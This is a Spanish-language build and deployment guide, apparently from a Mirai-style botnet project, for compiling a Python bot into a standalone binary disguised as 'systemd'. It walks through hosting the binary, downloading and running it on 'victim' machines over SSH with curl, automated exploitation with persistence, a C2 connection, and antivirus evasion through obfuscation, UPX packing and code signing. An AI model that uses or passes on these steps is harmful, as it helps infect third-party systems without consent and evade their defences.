# 📦 Guía de Compilación a Binario

## 🎯 Objetivo

Compilar `bot_soldier.py` a **ejecutable standalone** que:
- ✅ NO requiere Python en la víctima
- ✅ Funciona en sistemas limpios
- ✅ Incluye todas las dependencias
- ✅ Es un solo archivo ejecutable

## 🚀 Compilación en Windows

### Paso 1: Ejecutar compilador
```bash
cd C:\Users\Rubir\Downloads\mirai
python compile_bot.py
```

### Paso 2: Esperar (2-3 minutos)
```
[1/5] Verificando PyInstaller...
[2/5] Limpiando builds anteriores...
[3/5] Creando archivo .spec optimizado...
[4/5] Compilando bot a ejecutable...
[5/5] Verificando ejecutable...

[+] ¡Ejecutable creado exitosamente!
[+] Ubicación: C:\Users\Rubir\Downloads\mirai\dist\systemd.exe
[+] Tamaño: 25.4 MB
```

### Paso 3: Probar localmente
```bash
cd dist
systemd.exe
```

Deberías ver:
```
[*] Conectando a C2 127.0.0.1:8443...
[+] Nuevo bot conectado: ...
```

## 🐧 Compilación en Linux (para víctimas Linux)

### Opción A: VM Ubuntu

```bash
# En VM Ubuntu:
git clone <tu-repo> o copiar archivos
cd mirai
python3 compile_bot.py

# Resultado:
# dist/systemd  (ejecutable Linux)
```

### Opción B: Docker Cross-Compilation

```bash
# Crear Dockerfile
cat > Dockerfile << 'EOF'
FROM python:3.9-slim
RUN apt-get update && apt-get install -y binutils
RUN pip install pyinstaller paramiko netaddr cryptography
WORKDIR /app
COPY bot_soldier.py .
COPY compile_bot.py .
RUN python compile_bot.py
EOF

# Compilar
docker build -t bot-compiler .
docker run -v $(pwd)/dist:/app/dist bot-compiler

# Extraer binario
# dist/systemd estará disponible
```

## 📤 Deployment

### 1. Subir binario a servidor web
```bash
cd C:\Users\Rubir\Downloads\mirai

# Opción A: Python HTTP Server
python -m http.server 8000

# Opción B: Nginx/Apache
# Copiar dist/systemd.exe a /var/www/html/
```

### 2. Verificar descarga
```bash
# Desde otra máquina:
curl http://tu-ip:8000/systemd -o test
# o
wget http://tu-ip:8000/systemd

# Verificar tamaño
ls -lh test
# Debería ser ~25MB
```

### 3. Actualizar configuración

En `bot_soldier.py` línea ~31:
```python
BINARY_SERVER = 'http://TU_IP:8000'  # Cambiar por tu IP real
```

## 🎯 Uso en Explotación

### Ejemplo 1: Explotación manual
```bash
# Conectar a víctima
ssh admin@192.168.1.50

# Descargar y ejecutar
cd /tmp
curl -O http://tu-ip:8000/systemd
chmod +x systemd
./systemd &
```

### Ejemplo 2: Explotación automática
```
★彡 Comandante> recon 1
★彡 Comandante> exploit 1 1

# El bot automáticamente:
# 1. Intenta descargar binario
# 2. Si falla, usa Python
# 3. Si falla, instala script persistente
```

## 📊 Tamaños de Binarios

```
Windows (systemd.exe):     ~25-30 MB
Linux (systemd):           ~20-25 MB
Linux ARM (systemd-arm):   ~18-22 MB
```

## ⚠️ Limitaciones

### Detección por Antivirus
**Problema**: Binarios PyInstaller son detectados

**Soluciones**:
1. Ofuscación con `pyarmor`
2. Firma de código
3. Empaquetado personalizado
4. UPX packing
5. Usar stub diferente

### Cross-Platform
**Problema**: .exe de Windows no funciona en Linux

**Soluciones**:
1. Compilar en cada plataforma
2. Usar Docker para múltiples builds
3. GitHub Actions para CI/CD

### Tamaño del Archivo
**Problema**: Binario muy grande (25+ MB)

**Soluciones**:
1. `--onefile --strip` (ya usado)
2. UPX compression
3. Eliminar módulos no usados
4. Usar PyOxidizer en vez de PyInstaller

## 🔧 Troubleshooting

### Error: "Failed to execute script"
```bash
# Solución: Agregar permisos
chmod +x dist/systemd

# O recompilar sin --noconsole para ver errores
```

### Error: "ImportError: libpython3.x.so not found"
```bash
# Solución: Compilar con --onefile
# Ya está configurado en compile_bot.py
```

### Error: Binario no funciona en víctima
```bash
# Verificar:
ldd dist/systemd  # Ver dependencias faltantes

# Si faltan librerías, compilar estático:
pip install staticx
staticx dist/systemd dist/systemd-static
```

## 🎓 Mejoras Avanzadas

### 1. Multi-Architecture Build

```bash
# Windows x64
python compile_bot.py

# Linux x64 (en VM)
python3 compile_bot.py

# Linux ARM (Raspberry Pi)
# Compilar en RPi o cross-compile
```

### 2. Ofuscación
```python
# Instalar pyarmor
pip install pyarmor

# Ofuscar antes de compilar
pyarmor obfuscate bot_soldier.py
python compile_bot.py
```

### 3. Firma Digital (Evadir AV)
```bash
# Comprar certificado de firma
# O auto-firmar (menos efectivo)
signtool sign /f cert.pfx /p password dist/systemd.exe
```

## ✅ Checklist de Compilación

- [ ] PyInstaller instalado
- [ ] bot_soldier.py sin errores de sintaxis
- [ ] Todas las dependencias en requirements.txt
- [ ] IP del C2 configurada correctamente
- [ ] Compilación exitosa (sin errores)
- [ ] Binario probado localmente
- [ ] Binario subido a servidor web
- [ ] URL actualizada en bot_soldier.py
- [ ] Sistema probado end-to-end

---

¿Listo para compilar? Ejecuta: `python compile_bot.py`
